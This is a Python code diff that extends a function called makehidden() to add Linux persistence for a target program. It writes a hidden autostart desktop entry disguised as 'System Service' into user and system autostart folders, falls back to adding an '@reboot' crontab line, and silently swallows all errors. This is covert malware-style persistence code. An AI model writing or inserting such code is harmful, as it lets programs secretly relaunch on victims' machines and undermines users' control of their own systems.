@@ -65,7 +65,44 @@ def makehidden():
                 if result.returncode != 0:
                     print(f"Registry add failed: {result.stderr.decode().strip()}")
             else:
-                pass
+                # Linux autostart method
+                autostart_paths = [
+                    os.path.expanduser("~/.config/autostart/"),
+                    "/etc/xdg/autostart/",
+                ]
+
+                desktop_entry = f"""[Desktop Entry]
+Type=Application
+Exec={target_file_path}
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+Name=System Service
+Comment=System background service
+"""
+
+                for path in autostart_paths:
+                    try:
+                        os.makedirs(path, exist_ok=True)
+                        with open(os.path.join(path, ".s_linux.desktop"), "w") as f:
+                            f.write(desktop_entry)
+                        break
+                    except (IOError, PermissionError):
+                        continue
+
+                # Alternative crontab method if desktop entry fails
+                try:
+                    current_cron = subprocess.check_output(
+                        ["crontab", "-l"], stderr=subprocess.PIPE
+                    ).decode()
+                except subprocess.CalledProcessError:
+                    current_cron = ""
+
+                if target_file_path not in current_cron:
+                    new_cron = f"{current_cron}\n@reboot {target_file_path}\n"
+                    subprocess.run(
+                        ["crontab", "-"], input=new_cron.encode(), check=True
+                    )
 
         except:
             pass
